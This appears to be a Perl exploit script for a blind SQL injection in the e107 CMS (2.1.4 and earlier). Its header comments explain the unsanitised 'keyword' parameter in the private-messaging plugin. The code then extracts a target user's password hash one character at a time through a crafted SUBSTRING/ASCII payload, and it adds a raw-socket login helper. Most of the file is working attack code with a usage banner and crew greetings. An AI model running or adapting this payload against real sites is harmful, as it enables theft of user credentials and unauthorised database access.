#!/usr/bin/perl
#
#
# e107 <= 2.1.4 "keyword" Blind SQL Injection Exploit
#
# --------------------------------------------------------------------------
# [*] Discovered by staker - staker[at]hotmail[dot]it 
# [*] Discovered on 09/03/2017
# [*] Site Vendor: http://www.e107.org
# [*] BUG: Blind SQL Injection
# --------------------------------------------------------------------------
#
#
# Description
# -------------------------------------------------------------------------
# e107 contains one flaw that allows an attacker to carry out an SQL
# injection attack. The issue is due to the "e107_plugins/pm/pm.php" script 
# not properly saniting user-supplied input to the "keyword" POST variable
# This may allow an attacker to inject or manipulate sql queries in
# the backend database regardless of php.ini settings
# -------------------------------------------------------------------------
# SHORT EXPLANATION
# -----------------------------------
# 
# FILE:  "e107_handlers/core_functions.php"
#
# 76. function vartrue(&$val, $default='')                     
# 77. {
# 78.   if (isset($val) && $val) { return $val; } {1} <--- variable is not sanized to be sent at the mysql database
# 79.    return $default;
# 80.}
#
# ----------------------------------
#
# FILE: "e107/e107_plugins/pm/pm.php"
#
# 
# 35. if(vartrue($_POST['keyword']))   {2}<--- if $_POST keyword variable is set, then e107 starts pm_user_lookup() function.
# 36. {
# 37.   pm_user_lookup();
# 38.}
#
#
#
# 615. function pm_user_lookup()
# 616. {
# 617.  $sql = e107::getDb();
# 618.
# 619. $query = "SELECT * FROM #user WHERE user_name REGEXP '^".$_POST['keyword']."' "; {3} <---- variable not sanized
# 620. if($sql->gen($query))
# 621. {
# 622. echo '[';
# 623  while($row = $sql->fetch())
# 624. {
# 625.   $u[] =  "{\"caption\":\"".$row['user_name']."\",\"value\":".$row['user_id']."}";
# 626. }
# 627.
# 628.  echo implode(",",$u);
# 629.  echo ']';
# -----------------------------------
#
#
# use your brain..
#
# Greetz to: Warwolfz Crew,
# meh, Dante90, SHADES MASTER and nexen
#
# -- 0gay --
#
# -----------------------------------
# YOUR MOM IS NOT SAFE ANYMORE!!
# CALL HER!!
# -----------------------------------



use strict;
use IO::Socket::INET;
use LWP::UserAgent;


        

my ($URL,$uid) = @ARGV;
my @chars = (8..122);
my ($i,$ord,$hash) = (1,undef,undef);





if (@ARGV != 2) { usage(); } 


$URL = parse::URL($URL);


syswrite (STDOUT,"[-] Crypted Password: ");


for ($i=0;$i<=60;$i++) 
{
             			
   foreach $ord (@chars) 
   { 
             
      if (e107::Query(sql($i,$ord),$URL) == 666 ) 
	  {  
	      syswrite (STDOUT,chr($ord));
		  $hash .= chr($ord);
		  last;
	  }
	  if ($i == 2 and not defined $hash) 
	  {
	     syswrite (STDOUT,"\n[-] Exploit Failed");
		 exit;
	  }	 
   }		   
}



if (length($hash) == 60) {
   die "\[-]Exploit Successfully";
}
else {
   die "\n[-] Exploit Failed";
}   





sub e107::Query 
{
     
      # 1st parameter, sql query
      # 2nd parameter, e107 website	  

	  my ($query,$URL) = @_;
      my $response = undef; 
	  
      my $lwp = new LWP::UserAgent;


      $lwp->default_header('User-Agent' => 'Lynx (textmode)');

      $response = $lwp->post($URL."/pm/",
                            [ 
			     keyword => $query
			    ]) or die $!;


        if ($response->content =~ /caption/) {
		   return 666;
		} 
        else {
           return 0;
        }		   
		 
}


sub parse::URL
{
        my $string = shift @_ || die($!);
         
        if ($string !~ /^http:\/\/?/i) {
                $string = 'http://'.$string;
        }
         
        return $string;
 }
 


sub sql
{
       
      # 1st parameter, an e107's userid
      # 2nd parameter substring number
      # 3rd parameter charcode number

      my ($i,$j,$sql) = (shift,shift,undef);
       
      $sql = "' AND ASCII(SUBSTRING((SELECT user_password FROM e107_user WHERE user_id=".$uid."),".$i.",1))=".$j."#";
              
      return $sql;        
}        





sub e107::Cookies
{

        my ($username,$password) = @_;
        my ($packet,$content);
        
        my $host = "127.0.0.1";   # Valid Host  (insert it manually)
		my $path = "/e107/";      # Valid e107 path (insert it manually)
		
		
		my $data = "username=",$username."&userpass=".$password."&userlogin=Sign+In";
		
		
		my $socket  = new IO::Socket::INET(
                                            PeerAddr => $host,
                                            PeerPort => 80,
                                            Proto    => 'tcp',
                                          ) or die $!;
		
		
		 
        $packet .= "POST ".$path."/login.php HTTP/1.1\r\n";
        $packet .= "Host: ".$host."\r\n";
        $packet .= "User-Agent: Lynx (textmode)\r\n";
        $packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
        $packet .= "Content-Length:".length($data)."\r\n";
        $packet .= "Connection: close\r\n\r\n";
        $packet.= $data;
		
        
		$socket->send($packet);
		
		while (<$socket>) {
		  $content .= $_;
		}  
		
		
		if ($content =~ /Set-Cookie: (.+?)/) {
		    return $1;
	    }
        else {
            die("[-] Login Failed..\n");
        }			
		
		
	# This function is useful to log-in and retrieves your cookies, but you don't need it for this exploit.
        # it works without log-in, but if you got some trouble, try to use this one.
        
	# e107::Login('YOUR USERNAME','YOUR PASSWORD');
}		
		
		
sub usage() {
         
        print "[*---------------------------------------------------------*]\n".
              "[*  e107 <= 2.1.4 'keyword' Blind SQL Injection Exploit    *]\n".
              "[*---------------------------------------------------------*]\n". 
              "[* Usage: perl web.pl [host] [uid]                         *]\n".
              "[*                                                         *]\n".
              "[* Options:                                                *]\n".
              "[* [host] insert a valid host                              *]\n".
              "[* [uid]  insert a userid                                  *]\n".
              "[*---------------------------------------------------------*]\n";        
      exit;                       
    
}